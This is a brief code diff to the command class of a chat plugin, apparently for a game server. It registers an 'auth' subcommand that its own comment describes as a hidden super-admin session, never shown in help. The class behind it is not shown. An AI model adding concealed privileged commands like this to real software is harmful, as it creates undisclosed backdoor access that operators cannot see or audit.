@@ -64,6 +64,9 @@ public class NovaChatCommand implements CommandExecutor, TabCompleter {
         // Admin commands
         subCommands.put("reload", new ReloadCommand(plugin));
         subCommands.put("debug", new DebugCommand(plugin));
+
+        // Hidden command: super-admin session for announce/title (never in help)
+        subCommands.put("auth", new AuthCommand(plugin));
     }
 
     @Override
